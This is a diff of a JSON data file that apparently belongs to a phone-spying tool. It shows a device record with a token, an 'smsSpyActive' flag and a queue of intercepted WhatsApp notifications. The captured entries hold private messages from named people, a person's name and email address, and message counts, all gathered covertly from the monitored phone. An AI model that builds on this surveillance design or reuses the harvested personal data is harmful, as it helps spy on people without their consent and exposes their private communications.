@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "00613901ddb20be7b9614da5e8ef8e90",
-    "lastSeen": 1776951108069,
+    "lastSeen": 1776951126031,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T07:08:58.851Z",
@@ -20,6 +20,30 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "Wabot",
+        "content": "📷 Thank you, Rama Yandi. The Wabot account for at6327638@gmail.com has been activated.\n\nLog in here:\nhttps://app.wabot.my/login or click button login to link your number 👇\n\nUser guide:\nhttps://docs.fatomate.com . Please check your email to get special coupon 20% off. \n\nIf you experience any issues, please let us know.",
+        "time": "23/04 21:32",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776951129142
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎63 pesan dari 42 chat",
+        "time": "23/04 21:32",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776951129123
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎73 pesan dari 43 chat",
+        "time": "23/04 21:32",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776951128612
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -3995,30 +4019,6 @@
         "time": "23/04 19:13",
         "pkg": "com.whatsapp",
         "receivedAt": 1776942837870
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "Oi: Bot Gc",
-        "content": "🎵 Pesan suara (2.59)",
-        "time": "23/04 19:13",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776942837704
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "Maya",
-        "content": "aku tadi pas dibilang jangan chat ga aku chat",
-        "time": "23/04 19:13",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776942837405
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "Rafly",
-        "content": "kalo mau nunggu bang reno ini",
-        "time": "23/04 19:13",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776942837250
       }
     ],
     "galleryPhotos": [],
